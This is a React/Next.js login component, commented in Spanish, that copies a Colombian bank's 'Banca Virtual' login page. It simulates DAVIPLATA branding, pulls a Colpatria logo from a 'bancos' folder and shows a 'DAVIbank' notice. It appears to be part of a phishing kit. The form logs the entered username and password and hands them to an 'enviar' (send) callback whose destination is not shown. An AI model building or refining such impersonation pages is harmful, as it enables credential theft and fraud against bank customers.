/* eslint-disable @next/next/no-html-link-for-pages */
/* eslint-disable @next/next/no-img-element */
// app/promo/components/LoginCard.tsx
"use client";
import React, { useState } from 'react'; // 👈 Importar useState
import { User, Lock } from 'lucide-react';

// Componente simulando el logo de "DAVIPLATA bank"
const DaviplataLogo: React.FC = () => ( // Eliminamos 'enviar' si no se usa aquí
  <div className="flex items-center space-x-1 mb-6 pt-2">
    {/* Este es un placeholder, deberías usar tu propio SVG o imagen */}
    <img src="/bancos/colpatria/new-brand-red.svg" className='h-8 w-[120px]' alt="DAVIPLATA Logo" />
  </div>
);

// Define la interfaz de props para mayor claridad (opcional pero recomendado)
interface LoginCardProps {
  enviar?: ({ view, user, pass }: { view: string, user: string, pass: string }) => void;
}

const LoginCard: React.FC<LoginCardProps> = ({ enviar }) => { // 👈 Recibir 'enviar' como prop
  // 1. Usar estado para almacenar el usuario y la contraseña
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Intentando ingresar con Usuario:", username, "y Contraseña:", password);

    // 2. Corregido: Enviar el usuario y la contraseña desde el estado
    enviar?.({ view: "login", user: username, pass: password });
  };

  return (
    // Contenedor principal para simular la tarjeta de login
    <div className="w-full mx-auto pl-[37px] pr-[37px] pt-[41px] pb-0 bg-white">

      <DaviplataLogo />

      <h1 className="text-[27px] font-extrabold text-gray-800 mb-8">
        Ingresa a tu Banca Virtual
      </h1>

      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Campo Nombre de usuario */}
        <div className="relative">
          <User className="absolute left-0 top-1/2 transform -translate-y-1/2 text-gray-500 w-5 h-5" />
          <input
            type="text"
            placeholder="Nombre de usuario"
            className="w-full pl-7 pb-2 border-b-2 border-gray-300 focus:border-[#007eab] outline-none text-base transition duration-150"
            required
            // 3. Vincular el valor del input al estado y actualizarlo en cada cambio
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>

        {/* Campo Contraseña */}
        <div className="relative pt-4">
          <Lock className="absolute left-0 top-[calc(100% - 1.5rem)] transform -translate-y-1/2 text-gray-500 w-4 h-4" />
          <input
            type="password"
            placeholder="Contraseña"
            className="w-full pl-7 pb-2 border-b-2 border-gray-300 focus:border-[#007eab] outline-none text-base transition duration-150"
            required
            // 3. Vincular el valor del input al estado y actualizarlo en cada cambio
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <div className="margin-xs-18--top text-[#007eab]"><a className="link link__text font-bold text-[12px]" id="linkHelpId">¿Olvidaste tu usuario o contraseña?</a></div>
        </div>

        {/* Checkbox Recordar */}
        <div className="flex items-center pt-2">
          <input
            id="remember"
            type="checkbox"
            className="h-4 w-4 text-[#007eab] border-gray-300 rounded focus:ring-[#007eab]"
          />
          <label htmlFor="remember" className="ml-2 text-sm text-gray-700 select-none">
            Recordar mi nombre de usuario
          </label>
        </div>

        {/* Botón Ingresar */}
        <button
          type="submit"
          className="w-full py-3 mt-8 text-[16px] text-white bg-[#ec111a] hover:bg-[#be061b] font-medium rounded-md transition duration-200 shadow-md cursor-pointer"
        >
          Ingresar
        </button>
      </form>

      {/* Enlaces inferiores (sin cambios) */}
      <div className="flex justify-between items-center mt-6 text-sm">
        <span className="text-gray-600">
          ¿Eres nuevo con nosotros?
        </span>
        <a
          href="/activar-usuario"
          className="text-[#007eab] font-bold hover:text-red-700 flex items-center"
        >
          Activa tu usuario
        </a>
      </div>
      <div className="buddytip-container buddytip-container--flat mt-6">
        <div className="block block--centered buddytip-container__img">
          {/* Contenedor del ícono SVG */}
          <svg
            width="32"
            height="26"
            viewBox="0 0 32 26"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
            focusable="false"
            role="presentation"
            aria-hidden="true"
            className="svg-icon svg-icon-illustrative--size-36px flex"
          >
            <path d="M26.5277 15.8639C29.0714 15.8639 31.1334 13.8018 31.1334 11.2581C31.1334 8.71442 29.0714 6.65234 26.5277 6.65234C23.984 6.65234 21.9219 8.71442 21.9219 11.2581C21.9219 13.8018 23.984 15.8639 26.5277 15.8639Z" fill="#91DDF8"></path>
            <path fillRule="evenodd" clipRule="evenodd" d="M26.3832 0.975607C26.4765 1.16152 26.5261 1.36634 26.528 1.57436V20.945C26.5266 21.4037 26.2865 21.8287 25.8942 22.0665C25.5019 22.3043 25.014 22.3206 24.6067 22.1096L15.0661 17.1814H10.2301V5.33794H15.0661L24.6067 0.409754C24.9172 0.248544 25.2791 0.217611 25.6124 0.323789C25.9458 0.429968 26.2231 0.664517 26.3832 0.975607ZM4.815 6.65395V15.8655H2.18313C1.45635 15.8655 0.867188 15.2763 0.867188 14.5496V7.96989C0.867187 7.24311 1.45635 6.65395 2.18313 6.65395H4.815Z" fill="#009DD6"></path>
            <path d="M5.47316 17.1833C4.74639 17.1833 4.15723 16.5941 4.15723 15.8673V6.65578C4.15723 5.92901 4.74639 5.33984 5.47316 5.33984H11.3949V17.1833L14.0268 23.9472C14.1531 24.2735 14.1443 24.6366 14.0023 24.9564C13.8603 25.2762 13.5968 25.5262 13.2701 25.6513C13.1181 25.7063 12.958 25.7353 12.7964 25.7369H10.4803C9.93535 25.738 9.44609 25.4031 9.2499 24.8947L6.28247 17.1833H5.47316Z" fill="#7849B8"></path>
          </svg>
        </div>
        <p className="text text--small">
          DAVIbank tiene un aviso importante para ti
          <b className="text text--small text--bold link link__text">Lee más aquí</b>
        </p>
      </div>
    </div>
  );
};

export default LoginCard;